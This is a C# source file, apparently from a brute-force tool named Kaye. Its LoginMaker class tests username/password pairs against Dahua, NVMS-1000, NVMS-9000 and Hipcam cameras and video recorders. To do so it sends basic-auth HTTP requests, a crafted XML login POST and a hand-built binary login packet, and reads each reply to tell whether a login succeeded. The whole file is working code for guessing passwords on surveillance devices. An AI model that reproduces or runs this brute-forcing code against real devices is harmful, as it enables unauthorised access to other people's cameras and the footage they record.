using System;
using System.Net;
using System.Text;
using System.Net.Sockets;

using Kaye.Net;
using Kaye.Models;

namespace Kaye.BruteForce
{
    public class LoginMaker
    {
        IPEndPoint Target;
        Model Model;

        public static Boolean IsModelImplemented(Model Model)
        {
            return Model == Model.Dahua || Model == Model.NVMS1000 || Model == Model.NVMS9000 || Model == Model.NVMS1000 || Model == Model.Hipcam;
        }

        public LoginMaker(IPEndPoint Target, Model Model)
        {
            this.Target = Model == Model.NVMS1000 ? new IPEndPoint(Target.Address, GetNVMS1000ServerPort(Target)) : Target;
            this.Model = Model;
        }

        public Boolean TryLogin(String Username, String Password)
        {
            if (Model == Model.Dahua) return DahuaLogin(Username, Password);
            if (Model == Model.NVMS1000) return NVMS1000Login(Username, Password);
            if (Model == Model.NVMS9000) return NVMS9000Login(Username, Password);
            if (Model == Model.Hipcam) return HipcamLogin(Username, Password);
            return false;
        }

        private Boolean DahuaLogin(String Username, String Password)
        {
            FastWebClient client = new FastWebClient();
            client.TimeOut = 1500;
            client.Credentials = new NetworkCredential(Username, Password);
            try
            {
                String Response = client.DownloadString("http://" + Target.Address.ToString() + ":" + Target.Port.ToString() + "/cgi-bin/snapshot.cgi?");
                if (Response.IndexOf("Error") != -1) return false;
                return true;
            }
            catch { }

            return false;
        }

        private Boolean HipcamLogin(String Username, String Password)
        {
            FastWebClient client = new FastWebClient();
            client.TimeOut = 1500;
            client.Credentials = new NetworkCredential(Username, Password);
            try
            {
                client.DownloadData("http://" + Target.Address.ToString() + ":" + Target.Port.ToString() + "/");
                return true;
            }
            catch { }

            return false;
        }

        private Boolean NVMS9000Login(String Username, String Password)
        {
            try
            {
                String xml = "<?xml version=\"1.0\" encoding=\"utf-8\" ?><request version=\"1.0\"   systemType=\"NVMS-9000\" clientType=\"WEB\">" +
                             "<content><userName><![CDATA[" + Username + "]]></userName><password><![CDATA[" + Base64Encode(Password) + "]]></password></content></request>";
                String req = "POST /doLogin HTTP/1.1\r\n" +
                             "Host: " + Target.Address.ToString() + "\r\n" +
                             "Accept-Language: bg,en-US;q=0.7,en;q=0.3\r\n" +
                             "Accept-Encoding: gzip, deflate\r\n" +
                             "Authorization: Basic " + Base64Encode(Username + ":" + Password) + "\r\n" +
                             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" +
                             "X-Requested-With: XMLHttpRequest\r\n" +
                             "Content-Length: " + xml.Length.ToString() + "\r\n" +
                             "Connection: keep-alive\r\n\r\n" +
                             xml;
                TCPSender Sender = new TCPSender(Target.Address, Target.Port, req);
                if (Sender.response == null) return false;
                if (Sender.response.IndexOf("success") != -1) return true;
            }
            catch { }

            return false;
        }

        private Boolean NVMS1000Login(String Username, String Password)
        {
            try
            {
                Socket s = new Socket(Target.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                if (!SocketTools.Connect(s, Target, 1000)) return false;
                Byte[] LoginPacket = new Byte[144];
                LoginPacket[0] = 0x31;
                LoginPacket[1] = 0x31;
                LoginPacket[2] = 0x31;
                LoginPacket[3] = 0x31;
                LoginPacket[4] = 0x88;
                LoginPacket[8] = 0x01;
                LoginPacket[9] = 0x01;
                LoginPacket[12] = 0x18;
                LoginPacket[13] = 0x17;
                LoginPacket[14] = 0x5a;
                LoginPacket[15] = 0x10;
                LoginPacket[16] = 0x3e;
                LoginPacket[17] = 0x0a;
                LoginPacket[18] = 0x3c;
                LoginPacket[19] = 0x63;
                LoginPacket[20] = 0x78;
                LoginPacket[24] = 0x03;
                LoginPacket[32] = 0x61;
                LoginPacket[33] = 0x64;
                LoginPacket[34] = 0x6d;
                LoginPacket[35] = 0x69;
                LoginPacket[36] = 0x6e;
                for (Int32 i = 68; i < Math.Min(68 + Password.Length, 104); i++) LoginPacket[i] = (Byte)Password[i - 68];
                LoginPacket[132] = 0x0a;
                LoginPacket[134] = 0x27;
                LoginPacket[137] = 0x0e;
                LoginPacket[140] = 0x04;
                s.ReceiveTimeout = 2000;
                s.Send(LoginPacket);
                Byte[] buffer = new Byte[1024];
                Int32 c, packetcount = 0;
                while ((c = s.Receive(buffer)) != 0)
                {
                    packetcount++;
                    if (packetcount == 2) return (c >= 5 && buffer[4] == 108);
                }
            }

            catch { }

            return false;
        }

        private static Int32 GetNVMS1000ServerPort(IPEndPoint HttpPoint)
        {
            Int32 Output;
            HTTPSender Http = new HTTPSender(HttpPoint.Address, HttpPoint.Port);
            String Response = Http.DownloadString("/server.js");
            String[] Parts = Response.Split(new Char[] { '\r', '\n', '=' }, StringSplitOptions.RemoveEmptyEntries);

            for (Int32 i = 0; i < Parts.Length; i++)
            {
                if (Parts[i] == "NetPort" && i < Parts.Length - 1) return int.TryParse(Parts[i + 1], out Output) ? Output : 6036;
            }

            return -1;
        }

        private String Base64Encode(String Input)
        {
            Byte[] toEncodeAsBytes = Encoding.ASCII.GetBytes(Input);
            return Convert.ToBase64String(toEncodeAsBytes);
        }

    }
}